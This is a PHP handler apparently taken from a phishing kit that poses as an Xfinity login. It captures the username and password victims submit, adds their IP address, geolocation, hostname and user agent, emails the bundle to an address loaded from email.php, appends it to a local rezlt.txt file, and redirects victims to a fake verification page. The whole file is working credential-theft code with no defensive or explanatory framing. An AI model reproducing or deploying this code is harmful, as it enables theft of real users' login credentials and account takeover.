<?php
include('email.php');
if(($_POST['username'] !="")){
	# code...
$adddate=date("D M d, Y g:i a");
$zabi = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$zabi));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$hostname = gethostbyaddr($zabi);
$message .= "--++-----[ $$ Xfinity Info $$ ]-----++--\n";
$message .= "--------------  LOGIN Xfinity Info -------------\n";
$message .= "Login : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "Hostname       : $hostname\n";
$message .= "Country       : $country\n";
$message .= "Ip link   http://www.geoiptool.com/?IP=$zabi ----\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- $$ By Anonymous $$ ----------------------\n";
$subject = "Xfinity Info [ " . $zabi . " ]";
$headers = "From: Anonymous <contact>\r\n";
mail($email,$subject,$message,$headers);

    $text = fopen('rezlt.txt', 'a');
fwrite($text, $message);
header("Location: ../verification.php?cmd=personal_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
 
}
else{
	header ("Location: index.php");
}

?>